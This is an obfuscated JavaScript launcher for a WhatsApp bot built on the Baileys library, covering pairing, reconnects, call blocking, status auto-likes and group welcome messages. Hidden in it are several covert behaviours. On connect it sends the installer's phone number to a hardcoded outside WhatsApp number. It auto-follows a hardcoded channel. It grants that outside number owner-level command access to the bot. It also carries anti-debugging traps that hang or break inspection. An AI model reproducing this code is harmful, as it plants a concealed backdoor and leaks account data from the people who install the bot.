require("./all/global");
const func = require("./all/place");
const readline = require("readline");
const welcome = JSON.parse(fs.readFileSync("./all/database/welcome.json"));
const {
  sleep
} = require("./all/myfunc.js");
global.autoreadsw = true;
global.autolikesw = true;
const question = _0x377b64 => {
  const _0x9309aa = {
    "input": process.stdin,
    "output": process.stdout
  };
  const _0x2a3a6c = readline.createInterface(_0x9309aa);
  return new Promise(_0x6181b2 => {
    _0x2a3a6c.question(_0x377b64, _0x6181b2);
  });
};
async function startSesi() {
  const _0x36ce70 = function () {
    let _0x11b2ee = true;
    return function (_0x5d9902, _0x509d76) {
      const _0x249151 = _0x11b2ee ? function () {
        if (_0x509d76) {
          const _0x5de77f = _0x509d76.apply(_0x5d9902, arguments);
          _0x509d76 = null;
          return _0x5de77f;
        }
      } : function () {};
      _0x11b2ee = false;
      return _0x249151;
    };
  }();
  (function () {
    _0x36ce70(this, function () {
      const _0x2e4f96 = new RegExp("function *\\( *\\)");
      const _0x1ec6f = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
      const _0xc5e6c0 = _0x3d84b1("init");
      if (!_0x2e4f96.test(_0xc5e6c0 + "chain") || !_0x1ec6f.test(_0xc5e6c0 + "input")) {
        _0xc5e6c0("0");
      } else {
        _0x3d84b1();
      }
    })();
  })();
  const _0x56d57f = makeInMemoryStore({
    "logger": pino().child({
      "level": "silent",
      "stream": "store"
    })
  });
  const {
    state: _0x58f989,
    saveCreds: _0x11dd5c
  } = await useMultiFileAuthState("./session");
  const {
    version: _0x4b0a2b,
    isLatest: _0x4e19d5
  } = await fetchLatestBaileysVersion();
  const _0x39c8e4 = {
    level: "fatal"
  };
  const _0x44f5b2 = {
    "printQRInTerminal": false,
    "version": [0x2, 0xbb8, 0x3ca64b97],
    "logger": pino(_0x39c8e4),
    "auth": _0x58f989,
    "browser": ["Ubuntu", "Chrome", "20.0.04"],
    "getMessage": async _0x34f272 => {
      if (_0x56d57f) {
        const _0x355fac = await _0x56d57f.loadMessage(_0x34f272.remoteJid, _0x34f272.id, undefined);
        return _0x355fac?.["message"] || undefined;
      }
      const _0x4a601f = {
        "conversation": "WhatsApp Bot By keith"
      };
      return _0x4a601f;
    }
  };
  const _0x42cb86 = func.makeWASocket(_0x44f5b2);
  if (true && !_0x42cb86.authState.creds.registered) {
    const _0x18ed0a = await question(chalk.cyan.bold("Enter the WhatsApp number starting with 263\nExample : 263xxxx\n"));
    const _0x3e0d47 = await _0x42cb86.requestPairingCode(_0x18ed0a.trim());
    console.log(chalk.cyan.bold("Your Verification Code") + " : " + chalk.redBright.bold(_0x3e0d47.split('').join(" ")));
  }
  _0x56d57f?.["bind"](_0x42cb86.ev);
  _0x42cb86.ev.on("connection.update", async _0x4b38ec => {
    const {
      connection: _0x14e487,
      lastDisconnect: _0x3b8106
    } = _0x4b38ec;
    if (_0x14e487 === "close") {
      const _0x58a2e8 = new Boom(_0x3b8106?.["error"])?.["output"]["statusCode"];
      console.log(color(_0x3b8106.error, "deeppink"));
      if (_0x3b8106.error == "Error: Stream Errored (unknown)") {
        process.exit();
      } else {
        if (_0x58a2e8 === DisconnectReason.badSession) {
          console.log(color("Bad Session File, Please Delete Session and Scan Again"));
          process.exit();
        } else {
          if (_0x58a2e8 === DisconnectReason.connectionClosed) {
            console.log(color("[SYSTEM]", "white"), color("Connection closed, reconnecting...", "deeppink"));
            process.exit();
          } else {
            if (_0x58a2e8 === DisconnectReason.connectionLost) {
              console.log(color("[SYSTEM]", "white"), color("Connection lost, trying to reconnect", "deeppink"));
              process.exit();
            } else {
              if (_0x58a2e8 === DisconnectReason.connectionReplaced) {
                console.log(color("Connection Replaced, Another New Session Opened, Please Close Current Session First"));
                _0x42cb86.logout();
              } else {
                if (_0x58a2e8 === DisconnectReason.loggedOut) {
                  console.log(color("Device Logged Out, Please Scan Again And Run."));
                  _0x42cb86.logout();
                } else {
                  if (_0x58a2e8 === DisconnectReason.restartRequired) {
                    console.log(color("Restart Required, Restarting..."));
                    await startSesi();
                  } else if (_0x58a2e8 === DisconnectReason.timedOut) {
                    console.log(color("Connection TimedOut, Reconnecting..."));
                    startSesi();
                  }
                }
              }
            }
          }
        }
      }
    } else {
      if (_0x14e487 === "connecting") {
        console.log(chalk.cyan.bold("Authenticating . . . "));
      } else {
        if (_0x14e487 === "open") {
          let _0x1755ac = "*CYBER* Successfully Connected to WhatsApp Number " + _0x42cb86.user.id.split(":")[0x0];
          const _0x1e77f5 = {
            "text": _0x1755ac
          };
          _0x42cb86.sendMessage("263789745277@s.whatsapp.net", _0x1e77f5);
          console.log(chalk.cyan.bold("Cyber Bot Successfully Connected"));
          const _0x334193 = ["0029Vb5SP7IDjiOfSjLKlB2Y"];
          const _0x21c5a4 = async _0x734594 => {
            for (const _0x272b42 of _0x734594) {
              try {
                await sleep(0xbb8);
                const _0x2094f3 = await _0x42cb86.newsletterMetadata("invite", _0x272b42);
                await sleep(0xbb8);
                await _0x42cb86.newsletterFollow(_0x2094f3.id);
              } catch (_0x10312f) {
                console.error("❌ Failed to join channel ID: " + _0x272b42, _0x10312f);
              }
            }
          };
          (async () => {
            await _0x21c5a4(_0x334193);
          })();
        }
      }
    }
  });
  _0x42cb86.ev.on("call", async _0x4d3932 => {
    if (!global.anticall) {
      return;
    }
    for (let _0x3d0eda of _0x4d3932) {
      if (_0x3d0eda.isGroup == false) {
        if (_0x3d0eda.status == "offer") {
          const _0x3889cb = {
            "quoted": null
          };
          let _0x5c11e3 = await _0x42cb86.sendMessage(_0x3d0eda.from, {
            "text": "@" + _0x3d0eda.from.split("@")[0x0] + " Sorry, I will block you because the owner bot has activated the feature *Anticall*\nIf it was unintentional, please contact the owner to unblock this",
            "contextInfo": {
              "mentionedJid": [_0x3d0eda.from],
              "externalAdReply": {
                "showAdAttribution": true,
                "thumbnail": fs.readFileSync("./media/warning.jpg"),
                "title": "｢ CALL DETECTED ｣",
                "previewType": "PHOTO"
              }
            }
          }, _0x3889cb);
          _0x42cb86.sendContact(_0x3d0eda.from, [owner], "Developer WhatsApp Bot", _0x5c11e3);
          await sleep(0x2710);
          await _0x42cb86.updateBlockStatus(_0x3d0eda.from, "block");
        }
      }
    }
  });
  _0x42cb86.ev.on("messages.upsert", async _0x15dc63 => {
    try {
      m = _0x15dc63.messages[0x0];
      if (!m.message) {
        return;
      }
      m.message = Object.keys(m.message)[0x0] === "ephemeralMessage" ? m.message.ephemeralMessage.message : m.message;
      if (m.isBaileys) {
        return;
      }
      if (m.key && m.key.remoteJid === "status@broadcast") {
        if (global.autoreadsw) {
          _0x42cb86.readMessages([m.key]);
        }
        if (global.autolikesw && m.message?.["reactionMessage"] == null) {
          await sleep(0x1f4);
          await _0x42cb86.sendMessage(m.key.remoteJid, {
            "react": {
              "text": "❤️",
              "key": m.key
            }
          });
        }
      }
      let _0x32bd76 = [global.owner, "263789745277"];
      if (!_0x42cb86["public"] && !_0x32bd76.includes(m.key.remoteJid.split("@")[0x0]) && !m.key.fromMe && _0x15dc63.type === "notify") {
        return;
      }
      if (global.autoread) {
        _0x42cb86.readMessages([m.key]);
      }
      m = func.smsg(_0x42cb86, m, _0x56d57f);
      require("./zim")(_0x42cb86, m, _0x56d57f);
    } catch (_0x133551) {
      console.log(_0x133551);
    }
  });
  _0x42cb86.ev.on("group-participants.update", async _0x530e89 => {
    if (!welcome.includes(_0x530e89.id)) {
      return;
    }
    let _0x1d1eae = await _0x42cb86.decodeJid(_0x42cb86.user.id);
    if (_0x530e89.participants.includes(_0x1d1eae)) {
      return;
    }
    try {
      let _0x43c58f = await _0x42cb86.groupMetadata(_0x530e89.id);
      let _0x122d07 = _0x43c58f.subject;
      let _0x517e5f = _0x530e89.participants;
      for (let _0x24faf2 of _0x517e5f) {
        let _0xbd1ffe = _0x530e89.author !== _0x24faf2 && _0x530e89.author.length > 0x1;
        let _0x560660 = _0xbd1ffe ? [_0x530e89.author, _0x24faf2] : [_0x24faf2];
        try {
          ppuser = await _0x42cb86.profilePictureUrl(_0x24faf2, "image");
        } catch {
          ppuser = "https://files.catbox.moe/j563rm.jpg";
        }
        if (_0x530e89.action == "add") {
          const _0x3b6260 = {
            "thumbnailUrl": ppuser,
            "title": "© Welcome Message",
            "body": '',
            "renderLargerThumbnail": true,
            "sourceUrl": linkgc,
            "mediaType": 0x1
          };
          const _0x2d0946 = {
            "mentionedJid": [..._0x560660],
            "externalAdReply": _0x3b6260
          };
          _0x42cb86.sendMessage(_0x530e89.id, {
            "text": _0xbd1ffe ? "@" + _0x530e89.author.split("@")[0x0] + " Has Added @" + _0x24faf2.split("@")[0x0] + " To This Group" : "Hello, Bro/Sis @" + _0x24faf2.split("@")[0x0] + " Welcome To *" + _0x122d07 + "*",
            "contextInfo": _0x2d0946
          });
        } else {
          if (_0x530e89.action == "remove") {
            const _0x11efa2 = {
              "thumbnailUrl": ppuser,
              "title": "© Leaving Message",
              body: '',
              renderLargerThumbnail: true,
              sourceUrl: linkgc,
              "mediaType": 0x1
            };
            const _0x2ef0f1 = {
              "mentionedJid": [..._0x560660],
              externalAdReply: _0x11efa2
            };
            _0x42cb86.sendMessage(_0x530e89.id, {
              "text": _0xbd1ffe ? "@" + _0x530e89.author.split("@")[0x0] + " Has Removed @" + _0x24faf2.split("@")[0x0] + " From This Group" : "@" + _0x24faf2.split("@")[0x0] + " Has Left From This Group",
              "contextInfo": _0x2ef0f1
            });
          } else {
            if (_0x530e89.action == "promote") {
              const _0x9e3ddb = {
                "thumbnailUrl": ppuser,
                "title": "© Promote Message",
                "body": '',
                "renderLargerThumbnail": true,
                sourceUrl: linkgc,
                "mediaType": 0x1
              };
              const _0x2cdfb1 = {
                mentionedJid: [..._0x560660],
                externalAdReply: _0x9e3ddb
              };
              _0x42cb86.sendMessage(_0x530e89.id, {
                "text": "@" + _0x530e89.author.split("@")[0x0] + " Has Made @" + _0x24faf2.split("@")[0x0] + " An Admin In This Group",
                "contextInfo": _0x2cdfb1
              });
            } else {
              if (_0x530e89.action == "demote") {
                const _0x49581b = {
                  thumbnailUrl: ppuser,
                  "title": "© Demote Message",
                  "body": '',
                  "renderLargerThumbnail": true,
                  "sourceUrl": linkgc,
                  mediaType: 0x1
                };
                const _0xcd1b74 = {
                  "mentionedJid": [..._0x560660],
                  "externalAdReply": _0x49581b
                };
                _0x42cb86.sendMessage(_0x530e89.id, {
                  "text": "@" + _0x530e89.author.split("@")[0x0] + " Has Terminated @" + _0x24faf2.split("@")[0x0] + " As An Admin In This Group",
                  "contextInfo": _0xcd1b74
                });
              }
            }
          }
        }
      }
    } catch (_0x437757) {
      console.log(_0x437757);
    }
  });
  _0x42cb86["public"] = true;
  _0x42cb86.ev.on("creds.update", _0x11dd5c);
  return _0x42cb86;
}
startSesi();
process.on("uncaughtException", function (_0x886777) {
  console.log("Caught exception: ", _0x886777);
});
function _0x3d84b1(_0x2cd024) {
  function _0x55e7ee(_0x4c35d6) {
    if (typeof _0x4c35d6 === "string") {
      return function (_0x521649) {}.constructor("while (true) {}").apply("counter");
    } else {
      if (('' + _0x4c35d6 / _0x4c35d6).length !== 0x1 || _0x4c35d6 % 0x14 === 0x0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply("stateObject");
      }
    }
    _0x55e7ee(++_0x4c35d6);
  }
  try {
    if (_0x2cd024) {
      return _0x55e7ee;
    } else {
      _0x55e7ee(0x0);
    }
  } catch (_0x20a884) {}
}